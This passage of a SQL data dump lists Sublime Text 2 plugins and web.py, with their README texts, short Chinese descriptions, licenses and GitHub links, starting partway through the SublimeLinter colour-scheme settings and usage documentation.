<string>SublimeLinter Error Outline</string>\n        <key>scope</key>\n        <string>sublimelinter.outline.illegal</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#FF4A52</string>\n            <key>foreground</key>\n            <string>#FFFFFF</string>\n        </dict>\n    </dict>\n    <dict>\n        <key>name</key>\n        <string>SublimeLinter Error Underline</string>\n        <key>scope</key>\n        <string>sublimelinter.underline.illegal</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#FF0000</string>\n        </dict>\n    </dict>\n    <dict>\n        <key>name</key>\n        <string>SublimeLinter Warning Outline</string>\n        <key>scope</key>\n        <string>sublimelinter.outline.warning</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#DF9400</string>\n            <key>foreground</key>\n            <string>#FFFFFF</string>\n        </dict>\n    </dict>\n    <dict>\n        <key>name</key>\n        <string>SublimeLinter Warning Underline</string>\n        <key>scope</key>\n        <string>sublimelinter.underline.warning</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#FF0000</string>\n        </dict>\n    </dict>\n    <dict>\n        <key>name</key>\n        <string>SublimeLinter Violation Outline</string>\n        <key>scope</key>\n        <string>sublimelinter.outline.violation</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#ffffff33</string>\n            <key>foreground</key>\n            <string>#FFFFFF</string>\n        </dict>\n    </dict>\n    <dict>\n        <key>name</key>\n        <string>SublimeLinter Violation Underline</string>\n        <key>scope</key>\n        <string>sublimelinter.underline.violation</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#FF0000</string>\n        </dict>\n    </dict>\n\nUsing\n-----\nSublimeLinter runs in one of three modes, which is determined by the "sublimelinter" user setting:\n\n* **Background mode (the default)** - When the "sublimelinter" setting is true, linting is performed in the background as you modify a file (if the relevant linter supports it). If you like instant feedback, this is the best way to use SublimeLinter. If you want feedback, but not instantly, you can try another mode or set a minimum queue delay with the "sublimelinter_delay" setting, so that the linter will only run after a certain amount of idle time.\n* **Load-save mode** - When the "sublimelinter" setting is "load-save", linting is performed only when a file is loaded and after saving. Errors are cleared as soon as the file is modified.\n* **Save-only mode** - When the "sublimelinter" setting is "save-only", linting is performed only after a file is saved. Errors are cleared as soon as the file is modified.\n* **On demand mode** - When the "sublimelinter" setting is false, linting is performed only when initiated by you. Use the `Control+Command+L` (OS X) or `Control+Alt+L` (Linux/Windows) key equivalent or the Command Palette to lint the current file. If the current file has no associated linter, the command will not be available.\n\nWithin a file whose language/syntax is supported by SublimeLinter, you can control SublimeLinter via the Command Palette (`Command+Shift+P` on OS X, `Control+Shift+P` on Linux/Windows). The available commands are:\n\n* **SublimeLinter: Lint Current File** - Lints the current file, highlights any errors and displays how many errors were found.\n* **SublimeLinter: Show Error List** - Lints the current file, highlights any errors and displays a quick panel with any errors that are found. Selecting an item from the quick panel jumps to that line.\n* **SublimeLinter: Background Linting** - Enables background linting mode for the current view and lints it.\n* **SublimeLinter: Disable Linting** - Disables linting mode for the current view and clears all lint errors.\n* **SublimeLinter: Load-Save Linting** - Enables load-save linting mode for the current view and clears all lint errors.\n* **SublimeLinter: Save-Only Linting** - Enables save-only linting mode for the current view and clears all lint errors.\n* **SublimeLinter: Reset** - Clears all lint errors and sets the linting mode to the value in the SublimeLinter.sublime-settings file.\n\nDepending on the file and the current state of background enabling, some of the commands will not be available.\n\nWhen an error is highlighted by the linter, putting the cursor on the offending line will result in the error message being displayed on the status bar.\n\nIf you want to be shown a popup list of all errors whenever a file is saved, modify the user setting:\n\n    "sublimelinter_popup_errors_on_save": true\n\nIf there are errors in the file, a quick panel will appear which shows the error message, line number and source code for each error. The starting location of all errors on the line are marked with "^". Selecting an error in the quick panel jumps directly to the location of the first error on that line.\n\nWhile editing a file, you can quickly move to the next/previous lint error with the following key equivalents:\n\n* **OS X**:\n\n        next: Control+Command+E\n        prev: Control+Command+Shift+E\n\n* **Linux, Windows**:\n\n        next: Control+Alt+E\n        prev: Control+Alt+Shift+E\n\nBy default the search will wrap. You can turn wrapping off with the user setting:\n\n    "sublimelinter_wrap_find": false\n\nTroubleshooting\n---------------\nIf a linter does not seem to be working, you can check the ST2 console to see if it was enabled. When SublimeLinter is loaded, you will see messages in the console like this:\n\n    Reloading plugin /Users/aparajita/Library/Application Support/Sublime Text 2/Packages/SublimeLinter/sublimelinter_plugin.py\n    SublimeLinter: JavaScript loaded\n    SublimeLinter: annotations loaded\n    SublimeLinter: Objective-J loaded\n    SublimeLinter: perl loaded\n    SublimeLinter: php loaded\n    SublimeLinter: python loaded\n    SublimeLinter: ruby loaded\n    SublimeLinter: pylint loaded\n\nThe first time a linter is asked to lint, it will check to see if it can be enabled. You will then see messages like this:\n\n    SublimeLinter: JavaScript enabled (using JavaScriptCore)\n    SublimeLinter: Ruby enabled (using "ruby" for executable)\n\nLet\'s say the ruby linter is not working. If you look at the console, you may see a message like this:\n\n    SublimeLinter: ruby disabled ("ruby" cannot be found)\n\nThis means that the ruby executable cannot be found on your system, which means it is not installed or not in your executable path.\n\nCreating New Linters\n--------------------\nIf you wish to create a new linter to support a new language, SublimeLinter makes it easy. Here are the steps involved:\n\n* Create a new file in sublimelinter/modules. If your linter uses an external executable, you will probably want to copy perl.py. If your linter uses built in code, copy objective-j.py. The convention is to name the file the same as the language that will be linted.\n\n* Configure the CONFIG dict in your module. See the comments in base\\_linter.py for information on the values in that dict. You only need to set the values in your module that differ from the defaults in base\\_linter.py, as your module\'s CONFIG is merged with the default. Note that if your linter uses an external executable that does not take stdin, setting \'input\\_method\' to INPUT\\_METHOD\\_TEMP\\_FILE will allow interactive linting with that executable.\n\n* If your linter uses built in code, override `built_in_check()` and return the errors found.\n\n* Override `parse_errors()` and process the errors. If your linter overrides `built_in_check()`, `parse_errors()` will receive the result of that method. If your linter uses an external executable, `parse_errors()` receives the raw output of the executable, stripped of leading and trailing whitespace.\n\n* If you linter is powered via Javascript (eg. Node.js), there are few steps that will simplify the integration.\n\n  Create a folder matching your linter name in the `SublimeLinter/sublimelinter/modules/lib` directory. This folder should include the linting library JS file (eg. jshint.js, csslint-Node.js) and a **linter.js** file. The **linter.js** file should `require()` the actual linter library file and export a `lint()` function. The `lint()` function should return a list of errors back to the python language handler file (via the `errors` parameter to the `parse_errors()` method).\n\n  Although **linter.js** should follow the Node.js api, the linter may also be run via JavaScriptCore on OS X if Node.js is not installed. In the case where JavaScriptCore is used, require + export are shimmed to keep things consistent. However, it is important not to assume that a full Node.js api is available. If you must know what JS engine you are using, you may check for `USING_JSC` to be set as `true` when JavaScriptCore is used.\n\n  For examples of using the JS engines, see **csslint**, **jslint**, and **jshint** in `SublimeLinter/sublimelinter/modules/libs` and the respective python code of **css.py** and **javascript.py** in `SublimeLinter/sublimelinter/modules`.\n\n\nIf your linter has more complex requirements, see the comments for CONFIG in base\\_linter.py, and use the existing linters as guides.\n\n\n', 'SublimeLinter ', 'BSD', 'https://github.com/SublimeLinter/SublimeLinter', NULL, NULL, 9, 7, 'python', 0, '2012-07-22 18:39:57'),
	('6853e0beaa424b6ebbbc2ac6657330df', 'http://wbond.net/img/logo.png', 'Sublime SFTP', 'sublime text', '\n\nSublime SFTP为 sublime text 2提供了一个强有力的文件传输管理方案，可以为你节省更多的时间，让你有更多的时间来完成编码工作。不过它并不是免费的。\n\n\nSpend less time managing file transfers and more time coding. FTP, FTPS and SFTP support for Sublime Text 2 that is blazing fast, with smart features, flexible workflow options and top-notch support.\n\nWork off of a server – edit and manipulate files and folders\nMap a local folder to a remote folder\nPublish files, folders, or just the changes since your last commit\nSync folders – up, down or both directions\nDiff local vs. remote versions of a file\nOther operations and options to help you get stuff done\nPassword and SSH key auth with SSH agent support\nPersistent connections for performance\n', 'wbond', '...', 'http://wbond.net/sublime_packages/sftp', NULL, NULL, 6, 5, 'python', 0, '2012-07-22 20:30:18'),
	('6f717f3a499543d8a1ea3fa95a324cb0', 'http://wbond.net/img/logo.png', 'Sublime Prefixr', 'sublime text', '\n\nA Sublime Text 2 plugin to run CSS through the Prefixr API.\n\n## Features\n\n- Runs CSS through Prefixr\n- Works with multiple selections\n- Preserves whitespace when run inside a single CSS block\n- See the screenshots below for examples of the plugin in action.\n\n\n## Installation\n\nDownload Package Control and use the Package Control: Install Package command from the command palette. Using Package Control ensures Sublime Prefixr will stay up to date automatically.\n\n## Usage\n\n- Open a CSS file\n- Place cursor inside of a CSS block\n- Press ctrl+alt+x on Windows and Linux, or cmd+ctrl+x on OS X\n\nRunning a selections from individual CSS blocks produces the best looking results. Running a selection that spans multiple CSS blocks may change the indent level due to the way Prefixr works.', 'wbond', '...', 'http://wbond.net/sublime_packages/prefixr', NULL, NULL, 10, 6, 'python', 0, '2012-07-22 20:50:16'),
	('780767d56e704cc686e67898a3183256', 'https://secure.gravatar.com/avatar/2352358254d9d58bb0aaf4c0b843156d?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'SideBarEnhancements', 'sublime text', '\n\n这个插件为sublime text 2的边栏菜单增加了很多有用的功能，比如拷贝粘贴等\n\n# Description\n\nProvides enhancements to the operations on Side Bar of Files and Folders for Sublime Text 2. See: http://www.sublimetext.com/\n\nNotably provides delete as "move to trash", open with.. a and clipboard. Close, move, open and restore buffers affected by a rename/move command.\n\nProvides the basics: new file/folder, edit, open/run, reveal, find in selected/parent/project, cut, copy, paste, paste in parent, rename, move, delete, refresh....\n\nThe not so basic: copy paths as URIs, URLs, content as UTF8, content as data:uri base64 ( nice for embedding into CSS! ), copy as tags img/a/script/style, duplicate\n\n\nPreference to control if a buffer should be closed when affected by a deletion operation.\n\nAllows to display "file modified date" and "file size" on statusbar.\n\nAll commands available for files and folders(when applicable) .\n\n[img]http://dl.dropbox.com/u/43596449/tito/sublime/SideBar/screenshot.png[/img]\n\n<img src="http://dl.dropbox.com/u/43596449/tito/sublime/SideBar/screenshot.png" border="0"/>\n\n# F12 key\n\n\nF12 key allows you to open the current file in browser.\nIf you want to add a url to that feature:\nRight click the sidebar -> project -> edit project\nThere add the new preferences:\n\n```\n, "url":"http://localhost/"\n, "url_production":"http://domain.test/"\n```\n\n```url``` allows you to set the url of your local server, opened via F12\n```url_production``` allows you to set the url of your production server, opened via ALT+F12\n\n# Todo\n\n * Use a real clipboard integrated with the OS\n\n# Installation\n\nInstall this repository via "Package Control" http://wbond.net/sublime_packages/package_control\n\n# FAQ\n\n\nUninstall\n\nFollow the instructions here: https://github.com/titoBouzout/SideBarEnhancements/issues/18\n\n\n# Using the External Libraries\n\n\n * "getImageInfo" to get width and height for images from "bfg-pages". See: http://code.google.com/p/bfg-pages/\n * "desktop" to be able to open files with system handlers. See: http://pypi.python.org/pypi/desktop\n * "send2trash" to be able to send to the trash instead of deleting for ever!. See: http://pypi.python.org/pypi/Send2Trash\n * "hurry.filesize" to be able to format file sizes. See: http://pypi.python.org/pypi/hurry.filesize/\n\n# Source-code\n\n\nhttps://github.com/titoBouzout/SideBarEnhancements\n\n# Forum Thread\n\n\nhttp://www.sublimetext.com/forum/viewtopic.php?f=5&t=3331\n\n# Update v1.2:\n\n* Improved: Feature "find advanced -> in paths containing" or CTRL+ALT+F now provides instant search, contribution by @ryecroft, thanks a lot!\n* Fix: When only 1 tab is open and setting "close_windows_when_empty" is true. If the user renames or delete the current file will cause the application to close by itself (it will be perceived as a crash but is not).\n* New: Add to the command palette useful commands as duplicate, reveal, move, open project file, open in browser, refresh, rename\n* New: added keybindings F12 to open in local server, ALT+F12 to open in production server.\n* New: Allows to copy the URL of the selected items.\n* Improved: When renaming/moving remember the tab position and syntax.\n* small fixes:\n- Correct display of commands that are available only for projects\n- Be sure to return None if there is no open project\n- only display a message when using the clipboard if something was copied.\n\n# Update v1.1:\n\n* New: Add boolean preference "confirm_before_deleting" which controls if a the package should ask the user to delete files and folders\n* New: When using copy, cut or paste the editor will ask for "replace items" when these items exists. Note: When a folder exists the package will merge the two as in the OS.\n\n# Update v1.0:\n\n* New: Add boolean preference "close_affected_buffers_when_deleting_even_if_dirty" which controls if a buffer should be closed when affected by a deletion operation-\n\n# Update v0.9:\n\n\n* Minor tweaks and fixes.\n* Fix: Re-enable move to trash for OSX\n* New: Allow to display "file modified time" and "file size" on statusbar via preferences.\n* Fix: Disable of built-in function is now automatic.\n* On the way: exclude from project, promote as project folder. ( requires restart to apply changes, looks like there is no way to reload project files.)\n* Fix: Many appends of same directory to "sys.path"\n\n# Update v0.8:\n\n\n* Full review for when the user has selection of multiples items.\n* New: Added support for bookmarks and marks for when a view is moved.\n\n# Update v0.7:\n\n\n* New: After a rename of a file or folder, the affected views will update(reload) to reflect the new location keeping intact content, selections, folded regions and scroll position.\n* New: File path search\n\n# Update v0.6:\n\n\n* Fix: Paste was pasting on parent folder (Misinterpretation of boolean)\n* Fix: "Open with" works on Linux\n* Improved: Allow case change on Windows when renaming a file or folder\n* Improved: Update to "find commands" for version 2134\n\n# Update v0.5:\n\n\n* Change: Removed "files" prefix from commands.\n* New: Ability to copy a path relative to the current view\n* New: Ability to "paste in parent"\n* New: Ctrl+T will ask for a new file on same folder as current view\n* Improved: Context menu open faster\n\n# Update v0.4:\n\n\n* Fix: "Open / Run" fixed on Linux thanks to project [desktop](http://pypi.python.org/pypi/desktop )\n* Improved: "Paste" command copy permission bits, last access time, last modification time, and flags\n* Improved: "Delete" command send files to trash thanks to [Send2Trash](http://pypi.python.org/pypi/Send2Trash ) . NOTE: If "Delete" fails to send to trash it will ask for "Permanently Delete" On confirmation it delete the item forever.\n\n# Update v0.3:\n\n\n* Fixed: Open should run correctly with some strange characters on paths\n* New: "Open with.." is enabled and allows to set custom applications for different file extensions.\n* New:  "Copy content as Data URI" ( handy for embedding images on CSS files )\n* Improved: Copy img tags now add attributes width and height thanks to project [bfg-pages](http://code.google.com/p/bfg-pages/ ) and suggestion from nobleach.\n\n# Update v0.2:\n\n\n * Copy paths and names in various formats.\n * Removed license to not conflict with sublime\n\n# Update v0.1:\n\n\n * Tweaks here, tweaks there.\n * Renamed repository\n * New: "edit" will open the file with sublime text.\n * New: "open" will call to the command line with the file path\n * New: a disabled "open with" for future use\n * Tweaks: ids to all context elements\n', 'titoBouzout ', '...', 'https://github.com/titoBouzout/SideBarEnhancements', NULL, NULL, 6, 3, 'python', 0, '2012-07-22 20:43:59'),
	('9b7d1e6abfea4ceb841ecebd848b7b7d', 'https://secure.gravatar.com/avatar/b81f85ee58bb960a2fdf81bad8f31f2e?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'sublime text 2主题 soda-theme ', 'sublime text', '\n\n经典主题， Soda 主题提供了明暗两种风格\n\n# Soda Theme\n\nDark and light custom UI themes for Sublime Text 2.\n\n## Design\n\n![Soda Light Theme](http://buymeasoda.github.com/soda-theme/images/screenshots/soda-2-light-theme.png?v=3)\n\n![Soda Dark Theme](http://buymeasoda.github.com/soda-theme/images/screenshots/soda-2-dark-theme.png?v=1)\n\n## Installation\n\nSoda theme is designed to work with the latest [development build](http://www.sublimetext.com/dev) of Sublime Text 2.\n\n### Using Sublime Package Control\n\nIf you are using Will Bond\'s excellent [Sublime Package Control](http://wbond.net/sublime_packages/package_control), you can easily install Soda Theme via the `Package Control: Install Package` menu item. The Soda Theme package is listed as `Theme - Soda` in the packages list.\n\n### Using Git\n\nAlternatively, if you are a git user, you can install the theme and keep up to date by cloning the repo directly into your `Packages` directory in the Sublime Text 2 application settings area.\n\nYou can locate your Sublime Text 2 `Packages` directory by using the menu item `Preferences -> Browse Packages...`.\n\nWhile inside the `Packages` directory, clone the theme repository using the command below:\n\n    git clone https://github.com/buymeasoda/soda-theme/ "Theme - Soda"\n\n### Download Manually\n\n* Download the files using the GitHub .zip download option\n* Unzip the files and rename the folder to `Theme - Soda`\n* Copy the folder to your Sublime Text 2 `Packages` directory\n\n## Activating the theme\n\nTo configure Sublime Text 2 to use the theme:\n\n* Open your User Settings Preferences file `Sublime Text 2 -> Preferences -> Settings - User`\n* Add (or update) your theme entry to be `"theme": "Soda Light.sublime-theme"` or `"theme": "Soda Dark.sublime-theme"`\n\n### Example User Settings\n\n    {\n        "theme": "Soda Light.sublime-theme"\n    }\n\n## Additional Features\n\n### Alternate Tab Styles\n\nSoda Theme ships with two alternate UI tab styles.\n\nBy default, a square tab style is used. If you\'d prefer to use the original curved tab style, add the following custom setting to your `Settings - User` file:\n\n    "soda_classic_tabs": true\n\n![Soda Tab Styles](http://buymeasoda.github.com/soda-theme/images/features/multiple-tab-styles.png)\n\n### Retina Resolution UI\n\nSoda Light has been designed to take advantage of retina resolution (high-dpi) displays. Retina support for Soda Dark is coming soon.\n\n![Soda Retina](http://buymeasoda.github.com/soda-theme/images/features/soda-retina.png)\n\n## Bonus Options\n\n### Syntax Highlighting Colour Schemes\n\nThe Soda Light screenshot uses a modified version of Espresso Tutti Colori and the Soda Dark screenshot uses a modified version of Monokai.\n\nIf you\'d like to use the syntax highlighting schemes shown in the screenshots: \n\n* Download [colour-schemes.zip](http://buymeasoda.github.com/soda-theme/extras/colour-schemes.zip)\n* Unzip and place the extracted `tmtheme` files in the Sublime Text 2 `Packages/User` folder\n* Enable the colour scheme via `Preferences -> Color Scheme -> User`\n\n### Code Font\n\nThe code font shown in the screenshot is Menlo.\n\n## Development\n\nPlease note, Sublime Text dev builds move quickly and changes can occur with the theme API between releases, so there may be occasions where the theme doesn\'t quite work with a brand new dev release.\n\nWhile developing the theme, I have documented some [theme challenges and ideas](https://github.com/buymeasoda/soda-theme/wiki/Theme-challenges-and-ideas) encountered along the way.\n\n## License\n\nSoda Theme is licensed under the [Creative Commons Attribution-ShareAlike 3.0 License](http://creativecommons.org/licenses/by-sa/3.0/). You are free to share and remix the theme, however please abide by the license terms when doing so. \n\nThe following details apply to the Creative Commons license "author specified" components:\n\n* Attribution example: Based on Soda Theme by Ian Hill (http://buymeasoda.com/)\n\n* Naming guidelines: If you create and distribute a derivative theme, please give your theme a unique and original name that does not directly include "Soda Theme" (or a close variant) in the main project title, repo name or Package Control name.\n\nThe Soda Dark theme contains some icons from the excellent [Pictos](http://pictos.drewwilson.com/) series by Drew Wilson which I have a license for. Any use of these icons, other than for the purpose of the theme itself, would need to comply with Drew\'s [icon licensing agreement](http://stockart.drewwilson.com/license/).\n', 'buymeasoda ', 'CC BY-SA 3.0', 'https://github.com/buymeasoda/soda-theme', NULL, NULL, 6, 2, 'python', 0, '2012-07-22 20:04:37'),
	('a7c5851a69934e0399a9733231d94041', 'https://secure.gravatar.com/avatar/7106506e26bc0ba537e18ee5b3ac475c?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'SublimeText - jQuery', 'sublime text', '\n\n\n\nSublime Text 的 jquery支持库\n\n# jQuery Package for Sublime Text\n\nThis is a Sublime Text bundle to help with jQuery functions.\n\n## Authors\n\n* Zander Martineau\n* Karl Swedberg\n* Jonathan Chaffer\n\n## License\n\nThis bundle is dual-licensed under MIT and GPL licenses (just like jQuery).\n\n* [http://www.opensource.org/licenses/mit-license.php](http://www.opensource.org/licenses/mit-license.php)\n* [http://www.gnu.org/licenses/gpl.html](http://www.gnu.org/licenses/gpl.html)\n\nUse it, change it, fork it, sell it. Do what you will, but please leave the author attribution.\n', 'mrmartineau', 'BSD', 'https://github.com/SublimeText/jQuery', NULL, NULL, 11, 4, 'python', 0, '2012-07-22 20:36:37'),
	('afae9a307fe147b28e5333e062c0b3cd', 'https://secure.gravatar.com/avatar/243d527d308b5ee3d1952747225b1e6a?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'sublime-text-2-git,st2的git插件', 'sublime text', '\n\n\n\n这是一个全功能的git插件，基本上实现了git的所有功能。\n\n# Sublime Text 2: git plugin\n\nI like being able to quickly ask my editor "what\'s the history of this file?", without having to jump to another window. This plugin implements just enough git commands to be useful to me at the moment.\n\nI may add more, I may not. If you submit a pull request implementing something I missed, I\'ll almost certainly accept it.\n\n# Installation\n\n## Package Control\n\nThe easiest way to install this is with [Package Control](http://wbond.net/sublime\\_packages/package\\_control).\n\n * If you just went and installed Package Control, you probably need to restart Sublime Text 2 before doing this next bit.\n * Bring up the Command Palette (Command+Shift+p on OS X, Control+Shift+p on Linux/Windows).\n * Select "Package Control: Install Package" (it\'ll take a few seconds)\n * Select Git when the list appears.\n\nPackage Control will automatically keep Git up to date with the latest version.\n\n## More complex methods\n\nFirst, you need to have `git` installed and in your `$PATH`. Afterwards you may need to restart Sublime Text 2 before the plugin will work.\n\n### OSX\n\n    $ cd ~/Library/Application\\ Support/Sublime\\ Text\\ 2/Packages/\n    $ git clone git://github.com/kemayo/sublime-text-2-git.git Git\n\n### Linux (Ubuntu like distros)\n\n    $ cd ~/.config/sublime-text-2/Packages/\n    $ git clone git://github.com/kemayo/sublime-text-2-git.git Git\n\n### Windows 7:\n\n    Copy the directory to: "C:\\Users\\<username>\\AppData\\Roaming\\Sublime Text 2\\Packages"\n\n### Windows XP:\n\n    Copy the directory to: "C:\\Documents and Settings\\<username>\\Application Data\\Sublime Text 2\\Packages"\n\n## Settings\n\nThis plugin has a few settings. If you create a file called `Git.sublime-settings` in your `User` package you can override them. Feel free to copy the `Git.sublime-settings` file from the Git package directory to your `User` package if you don\'t want to mess with getting the initial JSON syntax right.\n\n * save_first: whether to save files before running any git operation\n * git_command: a path to your git binary if it\'s not in the $PATH available to Python (you\'ll get an error message if you need to set this)\n * _(format for windows: "git_command": "c:/users/myuserdir/dev/git/bin/git.exe")_\n\n# What\'s supported?\n\n![Command Palette](https://github.com/kemayo/sublime-text-2-git/wiki/images/palette.png)\n\n## Status\n\n![Status display](https://github.com/kemayo/sublime-text-2-git/wiki/images/status.png)\n\nShow the status of the repo. Chosing a file gives you a diff of it.\n\n## Log viewing\n\n![Log view](https://github.com/kemayo/sublime-text-2-git/wiki/images/log.png)\n\nYou can view the log, for the current file or for the whole repo.\n\n![Filtered log view](https://github.com/kemayo/sublime-text-2-git/wiki/images/log_filtered.png)\n\nYou can use fuzzy matching on the log details while viewing the log to find interesting commits.\n\n![Commit details](https://github.com/kemayo/sublime-text-2-git/wiki/images/log_details.png)\n\nYou can see more details about the given commit. This is either restricted to just your current file, or for all files in the repo, depending on how you got to it.\n\n## Diff viewing\n\n![Diff view](https://github.com/kemayo/sublime-text-2-git/wiki/images/diff.png)\n\nShow uncommitted changes in the current file or the whole repo. Displays with appropriate syntax highlighting.\n\n## Blame\n\n![Ugly blame view](https://github.com/kemayo/sublime-text-2-git/wiki/images/blame.png)\n\nGet an annotated version of the entire current file, or just the selected lines. (It\'s ugly now. I might fix it.)\n\n## Annotate\n\nLet Sublime annotate your changes while you are working.\n\n![Annotation 1](http://i.imgur.com/C5wBq.png) ![Annotation 2](http://i.imgur.com/4O7rd.png) ![Annotation 3](http://i.imgur.com/KG0Jt.png)\n\nYou need to add some custom theme scopes to make them appear in a different color than white. You can copy [these sample colors](https://gist.github.com/1344659) into your theme file, for example ".../Packages/Color Scheme - Default/Monokai.tmTheme"\n\n## Add files\n\nChose from a list of modified files to stage for a commit.\n\nThis looks exactly like the status display, so no picture here.\n\n## Commit\n\nAfter adding files, commit them all with a message.\n\n## Quick Commit\n\nAdd and commit the current file, after asking for a message.', 'sheldon', 'BSD', 'https://github.com/kemayo/sublime-text-2-git', NULL, NULL, 9, 3, 'python', 0, '2012-07-22 19:09:01'),
	('b0d4c4ccce344e24b70ca2c81285727b', 'https://secure.gravatar.com/avatar/ff70baa96ad35b264152658e365cc617?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'SublimeWebColors 显示所有的web颜色', 'sublime text', '\n\n\n## SublimeWebColors\n\nSublimeWebColors is a plugin for the growing popular editor [SublimeText 2](http://www.sublimetext.com/dev). It simply lists all CSS3 color names `indigo, gold, firebrick` etc and expands them to their representing hex codes; `#4B0082, #FFD700, #B22222`.\n\nSublimeWebColors will also append all CSS3 color names such `indigo, gold, firebrick` into the query suggestions list.\n\n## Sublime Package Control\n\n\nSublimeWebColors is fully installable via [Sublime Package Control](http://github.com/wbond/sublime_package_control).\n\nFollow the steps under Installation to install this plugin.\n\n## Usage\n\n\n- Windows: The default binding is set to `ctrl+shift+u`\n- Linux: The default binding is set to `ctrl+shift+u`\n- OSX: The default binding is set to `super+shift+u`\n\nYou can change these by overwriting the appropriate `*.sublime-keymap`\n\n## Credit\n\n\n`webcolors.py` is a Python library developed by James Bennett, see [BitBucket](https://bitbucket.org/ubernostrum/webcolors/) for his code.\n\n## License\n\nSublimeWebColors is licensed under the MIT License.\n\nCopyright (c) 2011 James Brooks <ukjbrooks@gmail.com>\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.', ' James Brooks ', '...', 'https://github.com/jbrooksuk/SublimeWebColors', NULL, NULL, 13, 5, 'python', 0, '2012-07-22 21:12:28'),
	('d5e83b872e9742ad8fe9298dbc1bd2a1', 'https://secure.gravatar.com/avatar/351c87a0731acb92739c6122cab96203?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'SublimeReader 为sublime text 2 提供文本阅读模式', 'sublime text', '\n\n\n## Text Reader \n\n### Function\n\n* automatically set to this "Reading Model" while opening text file larger than 10K\n* Set file to read only\n* space or enter to page down, shift+space to page up\n* remember the position of last read\n* able to set different font size, color because of adding a new syntax file \n\n## 文本阅读模式\n\n### 功能\n\n* 对于大于10K的文本文件自动设置阅读模式\n* 文件被设为只读\n* 使用空格或回车向下翻页，shift+空格向上翻页\n* 关闭文件时会记住阅读的位置\n* 可以单独设置字体和颜色\n\n### 其他\n\n* 可以安装ConvertToUTF8打开gbk文件\n\n', ' jedy', 'BSD', 'https://github.com/jedy/SublimeReader', NULL, NULL, 12, 5, 'python', 0, '2012-07-22 21:05:59'),
	('f53b1567ab884ccaa699fd9378bf046c', 'http://webpy.org/static/webpy.gif', 'python web框架 web.py', 'webpy,python', 'web.py is a web framework for python that is as simple as it is powerful.\r\n\r\n\r\nweb.py is in the public domain; it can be used for whatever purpose with absolutely no restrictions.\r\n\r\nCherryPy WSGI server that is included in the web.py as web.wsgiserver is licensed under CherryPy License. See web/wsgiserver/LICENSE.txt for more details.\r\n\r\nCopyright (c) 2004-2007, CherryPy Team (team@cherrypy.org)\r\nAll rights reserved.\r\n\r\nRedistribution and use in source and binary forms, with or without modification,\r\nare permitted provided that the following conditions are met:\r\n\r\n    * Redistributions of source code must retain the above copyright notice,\r\n      this list of conditions and the following disclaimer.\r\n    * Redistributions in binary form must reproduce the above copyright notice,\r\n      this list of conditions and the following disclaimer in the documentation\r\n      and/or other materials provided with the distribution.\r\n    * Neither the name of the CherryPy Team nor the names of its contributors\r\n      may be used to endorse or promote products derived from this software\r\n      without specific prior written permission.\r\n\r\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND\r\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\r\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\r\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE\r\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\r\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\r\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\r\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\r\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\r\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.', 'webpy', 'CherryPy License', 'https://github.com/webpy/webpy', NULL, NULL, 18, 6, 'python', 0, '2012-07-22 11:44:35'),
